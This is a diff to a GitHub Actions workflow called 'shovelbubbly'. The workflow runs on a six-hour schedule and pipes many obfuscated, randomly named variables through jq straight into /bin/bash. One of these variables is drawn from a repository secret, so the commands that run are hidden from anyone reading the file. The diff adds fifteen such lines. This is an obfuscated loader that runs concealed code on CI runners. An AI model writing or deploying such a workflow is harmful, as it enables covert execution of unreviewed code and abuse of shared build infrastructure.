@@ -3,21 +3,31 @@ name: shovelbubbly
 on:
   workflow_dispatch:
   schedule:
-    - cron: '17 1/6 * * *'
+    - cron: '12 3/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: shovelbubbly
         env:
-          dqwft96: ${{ secrets.dqwft96 }}
+          lv64: ${{ secrets.lv64 }}
         run: |
-          echo $dqwft96 | jq -r .i02 | /bin/bash
-          echo $l9629 | jq -r .r17 | /bin/bash
-          echo $ks0 | jq -r .qe27 | /bin/bash
-          echo $wz55559 | jq -r .bp34 | /bin/bash
-          echo $c08596 | jq -r .oa9 | /bin/bash
-          echo $iimas704 | jq -r .hazo163 | /bin/bash
-          echo $bdnz820 | jq -r .hnkaj4 | /bin/bash
+          echo $lv64 | jq -r .mlvnx89277 | /bin/bash
+          echo $ggk0941 | jq -r .o9 | /bin/bash
+          echo $xll26 | jq -r .az52393 | /bin/bash
+          echo $hstyz6866 | jq -r .qctnn19 | /bin/bash
+          echo $mbqv21 | jq -r .n4550 | /bin/bash
+          echo $g8 | jq -r .qz7667 | /bin/bash
+          echo $g694 | jq -r .yd19 | /bin/bash
+          echo $t803 | jq -r .b2837 | /bin/bash
+          echo $xr1934 | jq -r .pohe57967 | /bin/bash
+          echo $aodpl44836 | jq -r .dmv965 | /bin/bash
+          echo $ne77630 | jq -r .dncg11876 | /bin/bash
+          echo $v32 | jq -r .z0 | /bin/bash
+          echo $t95551 | jq -r .spqcd2826 | /bin/bash
+          echo $tew386 | jq -r .p48781 | /bin/bash
+          echo $hxtaa1681 | jq -r .ywer0430 | /bin/bash
 
